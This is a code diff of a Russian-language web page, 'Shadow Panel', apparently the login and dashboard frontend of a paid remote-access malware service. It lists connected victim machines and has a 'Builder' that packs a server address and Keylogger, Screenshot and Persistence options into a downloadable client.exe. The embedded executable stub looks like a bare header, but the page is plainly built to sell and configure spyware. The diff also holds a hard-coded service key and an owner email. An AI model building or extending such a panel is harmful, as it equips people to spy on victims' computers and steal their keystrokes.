@@ -4,8 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Shadow Panel</title>
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2">
-    </script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
     <style>
         * {
@@ -21,18 +20,16 @@
             font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
             overflow: hidden;
             letter-spacing: 0.2px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            /* убрали display:flex, выравнивание зададим только для контейнера входа */
         }
 
-        /* АВТОРИЗАЦИЯ — всегда по центру */
+        /* АВТОРИЗАЦИЯ — центрируем с помощью .login */
         .login {
             display: flex;
             align-items: center;
             justify-content: center;
-            width: 100%;
             height: 100%;
+            width: 100%;
             background: radial-gradient(ellipse at 30% 30%, #14142a 0%, #07070c 70%);
         }
 
@@ -89,10 +86,7 @@
             border-color: #00ff9d;
             box-shadow: 0 0 18px rgba(0, 255, 157, 0.2);
         }
-
-        .input-group input:focus+i {
-            color: #00ff9d;
-        }
+        .input-group input:focus+i { color: #00ff9d; }
 
         button {
             width: 100%;
@@ -106,24 +100,20 @@
             letter-spacing: 0.6px;
             transition: 0.25s;
         }
-
         .btn-primary {
             background: linear-gradient(135deg, #00ff9d, #00cc7a);
             color: #0a0a0a;
             font-weight: 700;
         }
-
         .btn-primary:hover {
             transform: translateY(-2px);
             box-shadow: 0 12px 28px rgba(0, 255, 157, 0.35);
         }
-
         .btn-outline {
             background: transparent;
             color: #b0b0c0;
             border: 1px solid #2a2a3a;
         }
-
         .btn-outline:hover {
             border-color: #00ff9d;
             color: #00ff9d;
@@ -138,19 +128,9 @@
             border-radius: 8px;
             padding: 8px 12px;
         }
-
-        .status-message.error {
-            color: #ff5e7a;
-            background: rgba(255, 50, 70, 0.08);
-        }
-        .status-message.success {
-            color: #00ff9d;
-            background: rgba(0, 255, 157, 0.08);
-        }
-        .status-message.info {
-            color: #ffb74d;
-            background: rgba(255, 183, 77, 0.08);
-        }
+        .status-message.error { color: #ff5e7a; background: rgba(255, 50, 70, 0.08); }
+        .status-message.success { color: #00ff9d; background: rgba(0, 255, 157, 0.08); }
+        .status-message.info { color: #ffb74d; background: rgba(255, 183, 77, 0.08); }
 
         /* ДЭШБОРД */
         .dashboard {
@@ -171,7 +151,6 @@
             gap: 6px;
             box-shadow: 4px 0 25px rgba(0, 0, 0, 0.6);
         }
-
         .sidebar h2 {
             font-weight: 600;
             letter-spacing: 1.5px;
@@ -196,7 +175,6 @@
             gap: 12px;
             border: 1px solid transparent;
         }
-
         .nav-item i {
             width: 20px;
             text-align: center;
@@ -204,29 +182,21 @@
             color: #6a6a7e;
             transition: 0.25s;
         }
-
         .nav-item:hover {
             background: rgba(255, 255, 255, 0.04);
             color: #ddd;
             border-color: rgba(255, 255, 255, 0.06);
         }
-        .nav-item:hover i {
-            color: #00ff9d;
-        }
-
+        .nav-item:hover i { color: #00ff9d; }
         .nav-item.active {
             background: rgba(0, 255, 157, 0.08);
             color: #00ff9d;
             border-color: rgba(0, 255, 157, 0.25);
             box-shadow: 0 0 18px rgba(0, 255, 157, 0.1);
         }
-        .nav-item.active i {
-            color: #00ff9d;
-        }
+        .nav-item.active i { color: #00ff9d; }
 
-        .spacer {
-            flex: 1;
-        }
+        .spacer { flex: 1; }
 
         .logout-btn {
             padding: 13px 16px;
@@ -240,7 +210,6 @@
             align-items: center;
             gap: 12px;
         }
-
         .logout-btn:hover {
             background: rgba(244, 114, 130, 0.1);
             border: 1px solid rgba(244, 114, 130, 0.2);
@@ -252,7 +221,6 @@
             overflow-y: auto;
             background: #0b0b12;
         }
-
         .main h1 {
             font-size: 30px;
             font-weight: 600;
@@ -260,10 +228,7 @@
             color: #f0f0f5;
             letter-spacing: -0.3px;
         }
-        .main p {
-            color: #9090a0;
-            line-height: 1.7;
-        }
+        .main p { color: #9090a0; line-height: 1.7; }
 
         .card-content {
             background: rgba(18, 18, 26, 0.7);
@@ -295,11 +260,7 @@
             font-size: 14px;
         }
 
-        button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            pointer-events: none;
-        }
+        button:disabled { opacity: 0.5; cursor: not-allowed; pointer-events: none; }
 
         .spinner {
             display: inline-block;
@@ -312,11 +273,7 @@
             margin-right: 8px;
             vertical-align: middle;
         }
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
         .build-form {
             display: flex;
@@ -354,284 +311,244 @@
     </style>
 </head>
 <body>
-    <div id="root"></div>
+<div id="root"></div>
 
-    <script>
-        const supabaseClient = supabase.createClient(
-            'https://bozcxkjhlhjslperttio.supabase.co',
-            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJvemN4a2pobGhqc2xwZXJ0dGlvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODI4NTk1MjIsImV4cCI6MjA5ODQzNTUyMn0.oRfVst1Js9IwulNXZl_SqcnXXqybCzvIdgFvWcoDSYg'
-        );
+<script>
+    const supabaseClient = supabase.createClient(
+        'https://bozcxkjhlhjslperttio.supabase.co',
+        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJvemN4a2pobGhqc2xwZXJ0dGlvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODI4NTk1MjIsImV4cCI6MjA5ODQzNTUyMn0.oRfVst1Js9IwulNXZl_SqcnXXqybCzvIdgFvWcoDSYg'
+    );
 
-        let currentView = 'login';
-        let activeNav = 'panel';
-        let isCreator = false;
+    let currentView = 'login';
+    let activeNav = 'panel';
+    let isCreator = false;
 
-        // ========== АВТОРИЗАЦИЯ ==========
-        function showAuthForm(view = 'login') {
-            currentView = view;
-            const isLogin = view === 'login';
-            document.getElementById('root').innerHTML = `
-            <div class="login">
-              <div class="card">
-                <h1>SHADOW PANEL</h1>
-                <form onsubmit="event.preventDefault(); ${isLogin ? 'handleLogin()' : 'handleRegister()'}">
-                  <div class="input-group">
-                    <input type="email" id="email" placeholder="Email" required>
-                    <i class="fas fa-envelope"></i>
-                  </div>
-                  <div class="input-group">
-                    <input type="password" id="password" placeholder="Пароль (мин. 6 символов)" required minlength="6">
-                    <i class="fas fa-lock"></i>
-                  </div>
-                  ${!isLogin ? `
-                  <div class="input-group">
-                    <input type="password" id="passwordConfirm" placeholder="Подтвердите пароль" required minlength="6">
-                    <i class="fas fa-check-circle"></i>
-                  </div>` : ''}
-                  <button type="submit" class="btn-primary" id="submitBtn">${isLogin ? 'Войти' : 'Зарегистрироваться'}</button>
-                </form>
-                <button class="btn-outline" onclick="showAuthForm('${isLogin ? 'register' : 'login'}')">
-                  ${isLogin ? 'Нет аккаунта? Зарегистрироваться' : 'Уже есть аккаунт? Войти'}
-                </button>
-                <div class="status-message" id="status"></div>
+    // ========== АВТОРИЗАЦИЯ ==========
+    function showAuthForm(view = 'login') {
+        currentView = view;
+        const isLogin = view === 'login';
+        document.getElementById('root').innerHTML = `
+        <div class="login">
+          <div class="card">
+            <h1>SHADOW PANEL</h1>
+            <form onsubmit="event.preventDefault(); ${isLogin ? 'handleLogin()' : 'handleRegister()'}">
+              <div class="input-group">
+                <input type="email" id="email" placeholder="Email" required>
+                <i class="fas fa-envelope"></i>
               </div>
-            </div>`;
-        }
+              <div class="input-group">
+                <input type="password" id="password" placeholder="Пароль (мин. 6 символов)" required minlength="6">
+                <i class="fas fa-lock"></i>
+              </div>
+              ${!isLogin ? `
+              <div class="input-group">
+                <input type="password" id="passwordConfirm" placeholder="Подтвердите пароль" required minlength="6">
+                <i class="fas fa-check-circle"></i>
+              </div>` : ''}
+              <button type="submit" class="btn-primary" id="submitBtn">${isLogin ? 'Войти' : 'Зарегистрироваться'}</button>
+            </form>
+            <button class="btn-outline" onclick="showAuthForm('${isLogin ? 'register' : 'login'}')">
+              ${isLogin ? 'Нет аккаунта? Зарегистрироваться' : 'Уже есть аккаунт? Войти'}
+            </button>
+            <div class="status-message" id="status"></div>
+          </div>
+        </div>`;
+    }
 
-        function setStatus(msg, type) {
-            const el = document.getElementById('status');
-            if (el) { el.textContent = msg;
-                el.className = 'status-message ' + type; }
-        }
+    function setStatus(msg, type) {
+        const el = document.getElementById('status');
+        if (el) { el.textContent = msg; el.className = 'status-message ' + type; }
+    }
 
-        function setLoading(loading) {
-            const btn = document.getElementById('submitBtn');
-            if (!btn) return;
-            btn.disabled = loading;
-            btn.innerHTML = loading ? '<span class="spinner"></span> Загрузка...' : (currentView === 'login' ? 'Войти' :
-                'Зарегистрироваться');
-        }
+    function setLoading(loading) {
+        const btn = document.getElementById('submitBtn');
+        if (!btn) return;
+        btn.disabled = loading;
+        btn.innerHTML = loading ? '<span class="spinner"></span> Загрузка...' : (currentView === 'login' ? 'Войти' : 'Зарегистрироваться');
+    }
 
-        async function handleRegister() {
-            const email = document.getElementById('email').value.trim();
-            const pass = document.getElementById('password').value;
-            const pass2 = document.getElementById('passwordConfirm')?.value;
-            if (!email || !pass) return setStatus('Заполните все поля', 'error');
-            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return setStatus('Некорректный email', 'error');
-            if (pass.length < 6) return setStatus('Минимум 6 символов', 'error');
-            if (pass2 && pass !== pass2) return setStatus('Пароли не совпадают', 'error');
+    async function handleRegister() {
+        const email = document.getElementById('email').value.trim();
+        const pass = document.getElementById('password').value;
+        const pass2 = document.getElementById('passwordConfirm')?.value;
+        if (!email || !pass) return setStatus('Заполните все поля', 'error');
+        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return setStatus('Некорректный email', 'error');
+        if (pass.length < 6) return setStatus('Минимум 6 символов', 'error');
+        if (pass2 && pass !== pass2) return setStatus('Пароли не совпадают', 'error');
 
-            setLoading(true);
-            const { data, error } = await supabaseClient.auth.signUp({ email, password: pass });
-            setLoading(false);
-            if (error) return setStatus(error.message.includes('already') ? 'Пользователь уже существует' : error.message,
-                'error');
-            if (data?.session) { showDashboard(); } else { setStatus('Подтвердите email (проверьте почту)', 'success');
-                setTimeout(() => showAuthForm('login'), 3000); }
-        }
+        setLoading(true);
+        const { data, error } = await supabaseClient.auth.signUp({ email, password: pass });
+        setLoading(false);
+        if (error) return setStatus(error.message.includes('already') ? 'Пользователь уже существует' : error.message, 'error');
+        if (data?.session) { showDashboard(); }
+        else { setStatus('Подтвердите email (проверьте почту)', 'success'); setTimeout(() => showAuthForm('login'), 3000); }
+    }
 
-        async function handleLogin() {
-            const email = document.getElementById('email').value.trim();
-            const pass = document.getElementById('password').value;
-            if (!email || !pass) return setStatus('Заполните все поля', 'error');
-            setLoading(true);
-            const { data, error } = await supabaseClient.auth.signInWithPassword({ email, password: pass });
-            setLoading(false);
-            if (error) return setStatus('Неверный email или пароль', 'error');
-            if (data?.session) showDashboard();
-        }
+    async function handleLogin() {
+        const email = document.getElementById('email').value.trim();
+        const pass = document.getElementById('password').value;
+        if (!email || !pass) return setStatus('Заполните все поля', 'error');
+        setLoading(true);
+        const { data, error } = await supabaseClient.auth.signInWithPassword({ email, password: pass });
+        setLoading(false);
+        if (error) return setStatus('Неверный email или пароль', 'error');
+        if (data?.session) showDashboard();
+    }
 
-        // ========== ДЭШБОРД ==========
-        async function showDashboard() {
-            currentView = 'dashboard';
+    // ========== ДЭШБОРД ==========
+    async function showDashboard() {
+        currentView = 'dashboard';
+        const { data: { user } } = await supabaseClient.auth.getUser();
+        isCreator = (user?.email === 'kilersosiska130@gmail.com');
+
+        document.getElementById('root').innerHTML = `
+        <div class="dashboard">
+          <div class="sidebar">
+            <h2>SHADOW<span class="creator-badge">${isCreator ? 'CREATOR' : ''}</span></h2>
+            <div class="nav-item ${activeNav==='panel'?'active':''}" onclick="showPanel()">
+              <i class="fas fa-users"></i> Панель
+            </div>
+            <div class="nav-item ${activeNav==='builder'?'active':''}" onclick="showBuilder()">
+              <i class="fas fa-cubes"></i> Builder
+            </div>
+            <div class="nav-item ${activeNav==='notify'?'active':''}" onclick="showNotify()">
+              <i class="fas fa-bell"></i> Уведомления
+            </div>
+            <div class="nav-item ${activeNav==='community'?'active':''}" onclick="showCommunity()">
+              <i class="fas fa-comments"></i> Форум
+            </div>
+            <div class="nav-item ${activeNav==='subs'?'active':''}" onclick="showSubs()">
+              <i class="fas fa-crown"></i> Подписки
+            </div>
+            <div class="nav-item ${activeNav==='settings'?'active':''}" onclick="showSettings()">
+              <i class="fas fa-gear"></i> Настройки
+            </div>
+            <div class="spacer"></div>
+            <div class="logout-btn" onclick="handleLogout()">
+              <i class="fas fa-right-from-bracket"></i> Выйти
+            </div>
+          </div>
+          <div class="main" id="content">${getPanelContent()}</div>
+        </div>`;
+    }
+
+    function updateActiveNav(nav) {
+        activeNav = nav;
+        document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+        const items = document.querySelectorAll('.nav-item');
+        const map = { panel: 0, builder: 1, notify: 2, community: 3, subs: 4, settings: 5 };
+        if (items[map[nav]]) items[map[nav]].classList.add('active');
+    }
+
+    function getPanelContent() {
+        return `
+        <h1>Панель управления</h1>
+        <p>Список подключенных устройств <span class="tag">Demo</span></p>
+        <div class="card-content">
+          <table style="width:100%; border-collapse:collapse;">
+            <thead><tr><th>ID</th><th>Имя</th><th>ОС</th><th>Статус</th></tr></thead>
+            <tbody>
+              <tr><td>1024</td><td>DESKTOP-A1B2C3</td><td>Windows 10 Pro</td><td><span style="color:#00ff9d">●</span> Online</td></tr>
+              <tr><td>2048</td><td>LAPTOP-X7Y8Z9</td><td>Windows 11</td><td><span style="color:#555">●</span> Offline</td></tr>
+            </tbody>
+          </table>
+        </div>`;
+    }
+
+    function showPanel() { updateActiveNav('panel'); document.getElementById('content').innerHTML = getPanelContent(); }
+
+    function showBuilder() {
+        updateActiveNav('builder');
+        document.getElementById('content').innerHTML = `
+        <h1>Builder</h1>
+        <div class="card-content">
+          <p><i class="fas fa-unlock" style="color:#00ff9d;"></i> Редактор билда</p>
+          <div class="build-form">
+            <label>Сервер (IP:Port) <input type="text" id="server" value="127.0.0.1:4444"></label>
+            <label>Пароль <input type="password" id="buildPass" value="secret"></label>
+            <div class="module-group">
+              <label><input type="checkbox" id="modKeylog" checked> Keylogger</label>
+              <label><input type="checkbox" id="modScreen" checked> Screenshot</label>
+              <label><input type="checkbox" id="modPersist"> Persistence</label>
+            </div>
+            <button class="btn-primary" onclick="buildExe()">
+              <i class="fas fa-hammer"></i> Собрать EXE
+            </button>
+          </div>
+        </div>`;
+    }
+
+    function buildExe() {
+        const server = document.getElementById('server').value.trim();
+        const pass = document.getElementById('buildPass').value.trim();
+        const keylog = document.getElementById('modKeylog').checked;
+        const screen = document.getElementById('modScreen').checked;
+        const persist = document.getElementById('modPersist').checked;
+
+        const exeBase64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAADwMLAQEAAAAgAAAAAAAAAAsAAAAQAQAAABAAAAAQAAAQAAAAAAAAAAQAAAAAAAAAGAAAAAgAAAAAAAAIAAAAAAAAAIAQQAAABAAQAAAAAAAAgAEAAAAAAAAAAAAAAAAAEAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAEcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+        const exeBytes = Uint8Array.from(atob(exeBase64), c => c.charCodeAt(0));
+        const config = JSON.stringify({ server, pass, modules: { keylog, screen, persist } });
+        const configBytes = new TextEncoder().encode(config);
+        const finalBytes = new Uint8Array(exeBytes.length + configBytes.length);
+        finalBytes.set(exeBytes);
+        finalBytes.set(configBytes, exeBytes.length);
+
+        const blob = new Blob([finalBytes], { type: 'application/octet-stream' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'client.exe';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+        alert('EXE собран и сохранён!');
+    }
+
+    function showNotify() { updateActiveNav('notify'); document.getElementById('content').innerHTML = `<h1>Уведомления</h1><div class="card-content"><p>Настройка уведомлений.</p></div>`; }
+    function showCommunity() { updateActiveNav('community'); document.getElementById('content').innerHTML = `<h1>Форум</h1><div class="card-content"><p>Общий чат и новости.</p></div>`; }
+    function showSubs() { updateActiveNav('subs'); document.getElementById('content').innerHTML = `<h1>Подписки</h1><div class="card-content"><p>1 месяц — <span style="color:#00ff9d; font-size:20px;">500₽</span></p><button class="btn-primary" style="width:auto; margin-top:16px;" disabled>Оплатить (скоро)</button></div>`; }
+    function showSettings() {
+        updateActiveNav('settings');
+        document.getElementById('content').innerHTML = `<h1>Настройки</h1><div class="card-content"><p>Email: <strong id="userEmail">загрузка...</strong></p><button class="btn-outline" style="width:auto; margin-top:20px;" onclick="handleLogout()">Выйти</button></div>`;
+        supabaseClient.auth.getUser().then(({ data: { user } }) => {
+            const el = document.getElementById('userEmail');
+            if (el && user?.email) el.textContent = user.email;
+        });
+    }
+
+    async function handleLogout() {
+        await supabaseClient.auth.signOut();
+        currentView = 'login';
+        activeNav = 'panel';
+        isCreator = false;
+        showAuthForm('login');
+    }
+
+    window.onload = async () => {
+        const { data: { session } } = await supabaseClient.auth.getSession();
+        if (session) {
             const { data: { user } } = await supabaseClient.auth.getUser();
             isCreator = (user?.email === 'kilersosiska130@gmail.com');
-
-            document.getElementById('root').innerHTML = `
-            <div class="dashboard">
-              <div class="sidebar">
-                <h2>SHADOW<span class="creator-badge">${isCreator ? 'CREATOR' : ''}</span></h2>
-                <div class="nav-item ${activeNav==='panel'?'active':''}" onclick="showPanel()">
-                  <i class="fas fa-users"></i> Панель
-                </div>
-                <div class="nav-item ${activeNav==='builder'?'active':''}" onclick="showBuilder()">
-                  <i class="fas fa-cubes"></i> Builder
-                </div>
-                <div class="nav-item ${activeNav==='notify'?'active':''}" onclick="showNotify()">
-                  <i class="fas fa-bell"></i> Уведомления
-                </div>
-                <div class="nav-item ${activeNav==='community'?'active':''}" onclick="showCommunity()">
-                  <i class="fas fa-comments"></i> Форум
-                </div>
-                <div class="nav-item ${activeNav==='subs'?'active':''}" onclick="showSubs()">
-                  <i class="fas fa-crown"></i> Подписки
-                </div>
-                <div class="nav-item ${activeNav==='settings'?'active':''}" onclick="showSettings()">
-                  <i class="fas fa-gear"></i> Настройки
-                </div>
-                <div class="spacer"></div>
-                <div class="logout-btn" onclick="handleLogout()">
-                  <i class="fas fa-right-from-bracket"></i> Выйти
-                </div>
-              </div>
-              <div class="main" id="content">${getPanelContent()}</div>
-            </div>`;
+            showDashboard();
+        } else {
+            showAuthForm('login');
         }
+    };
 
-        function updateActiveNav(nav) {
-            activeNav = nav;
-            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
-            const items = document.querySelectorAll('.nav-item');
-            const map = { panel: 0, builder: 1, notify: 2, community: 3, subs: 4, settings: 5 };
-            if (items[map[nav]]) items[map[nav]].classList.add('active');
-        }
-
-        function getPanelContent() {
-            return `
-            <h1>Панель управления</h1>
-            <p>Список подключенных устройств <span class="tag">Demo</span></p>
-            <div class="card-content">
-              <table style="width:100%; border-collapse:collapse;">
-                <thead><tr><th>ID</th><th>Имя</th><th>ОС</th><th>Статус</th></tr></thead>
-                <tbody>
-                  <tr><td>1024</td><td>DESKTOP-A1B2C3</td><td>Windows 10 Pro</td><td><span style="color:#00ff9d">●</span> Online</td></tr>
-                  <tr><td>2048</td><td>LAPTOP-X7Y8Z9</td><td>Windows 11</td><td><span style="color:#555">●</span> Offline</td></tr>
-                </tbody>
-              </table>
-            </div>`;
-        }
-
-        function showPanel() { updateActiveNav('panel');
-            document.getElementById('content').innerHTML = getPanelContent(); }
-
-        function showBuilder() {
-            updateActiveNav('builder');
-            const content = document.getElementById('content');
-            content.innerHTML = `
-            <h1>Builder</h1>
-            <div class="card-content">
-              <p><i class="fas fa-unlock" style="color:#00ff9d;"></i> Редактор билда</p>
-              <div class="build-form">
-                <label>Сервер (IP:Port) <input type="text" id="server" value="127.0.0.1:4444"></label>
-                <label>Пароль <input type="password" id="buildPass" value="secret"></label>
-                <div class="module-group">
-                  <label><input type="checkbox" id="modKeylog" checked> Keylogger</label>
-                  <label><input type="checkbox" id="modScreen" checked> Screenshot</label>
-                  <label><input type="checkbox" id="modPersist"> Persistence</label>
-                </div>
-                <button class="btn-primary" onclick="buildExe()">
-                  <i class="fas fa-hammer"></i> Собрать EXE
-                </button>
-              </div>
-              <p style="margin-top:16px; font-size:13px; color:#666;">
-                Конфигурация будет добавлена в исполняемый файл.
-              </p>
-            </div>`;
-        }
-
-        function buildExe() {
-            const server = document.getElementById('server').value.trim();
-            const pass = document.getElementById('buildPass').value.trim();
-            const keylog = document.getElementById('modKeylog').checked;
-            const screen = document.getElementById('modScreen').checked;
-            const persist = document.getElementById('modPersist').checked;
-
-            const exeBase64 =
-                "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAADwMLAQEAAAAgAAAAAAAAAAsAAAAQAQAAABAAAAAQAAAQAAAAAAAAAAQAAAAAAAAAGAAAAAgAAAAAAAAIAAAAAAAAAIAQQAAABAAQAAAAAAAAgAEAAAAAAAAAAAAAAAAAEAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAEcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-            const exeBytes = Uint8Array.from(atob(exeBase64), c => c.charCodeAt(0));
-            const config = JSON.stringify({ server, pass, modules: { keylog, screen, persist } });
-            const configBytes = new TextEncoder().encode(config);
-            const finalBytes = new Uint8Array(exeBytes.length + configBytes.length);
-            finalBytes.set(exeBytes);
-            finalBytes.set(configBytes, exeBytes.length);
-
-            const blob = new Blob([finalBytes], { type: 'application/octet-stream' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'client.exe';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            alert('EXE собран и сохранён!');
-        }
-
-        function showNotify() {
-            updateActiveNav('notify');
-            document.getElementById('content').innerHTML = `
-            <h1>Уведомления</h1>
-            <div class="card-content">
-              <p>Настройка уведомлений о новых подключениях, задачах и ошибках.</p>
-            </div>`;
-        }
-
-        function showCommunity() {
-            updateActiveNav('community');
-            document.getElementById('content').innerHTML = `
-            <h1>Форум</h1>
-            <div class="card-content">
-              <p>Общий чат и новости проекта.</p>
-            </div>`;
-        }
-
-        function showSubs() {
-            updateActiveNav('subs');
-            document.getElementById('content').innerHTML = `
-            <h1>Подписки</h1>
-            <div class="card-content">
-              <p><strong>1 месяц</strong> — <span style="color:#00ff9d; font-size:20px;">500₽</span></p>
-              <button class="btn-primary" style="width:auto; margin-top:16px;" disabled>Оплатить (скоро)</button>
-            </div>`;
-        }
-
-        function showSettings() {
-            updateActiveNav('settings');
-            document.getElementById('content').innerHTML = `
-            <h1>Настройки</h1>
-            <div class="card-content">
-              <p>Email: <strong id="userEmail">загрузка...</strong></p>
-              <button class="btn-outline" style="width:auto; margin-top:20px;" onclick="handleLogout()">Выйти</button>
-            </div>`;
-            supabaseClient.auth.getUser().then(({ data: { user } }) => {
-                const el = document.getElementById('userEmail');
-                if (el && user?.email) el.textContent = user.email;
-            });
-        }
-
-        async function handleLogout() {
-            await supabaseClient.auth.signOut();
+    supabaseClient.auth.onAuthStateChange((event, session) => {
+        if (event === 'SIGNED_OUT') {
             currentView = 'login';
             activeNav = 'panel';
             isCreator = false;
             showAuthForm('login');
-        }
-
-        // Инициализация
-        window.onload = async () => {
-            const { data: { session } } = await supabaseClient.auth.getSession();
-            if (session) {
-                const { data: { user } } = await supabaseClient.auth.getUser();
+        } else if (event === 'SIGNED_IN' && session) {
+            supabaseClient.auth.getUser().then(({ data: { user } }) => {
                 isCreator = (user?.email === 'kilersosiska130@gmail.com');
                 showDashboard();
-            } else {
-                showAuthForm('login');
-            }
-        };
-
-        supabaseClient.auth.onAuthStateChange((event, session) => {
-            if (event === 'SIGNED_OUT') {
-                currentView = 'login';
-                activeNav = 'panel';
-                isCreator = false;
-                showAuthForm('login');
-            } else if (event === 'SIGNED_IN' && session) {
-                supabaseClient.auth.getUser().then(({ data: { user } }) => {
-                    isCreator = (user?.email === 'kilersosiska130@gmail.com');
-                    showDashboard();
-                });
-            }
-        });
-    </script>
+            });
+        }
+    });
+</script>
 </body>
 </html>
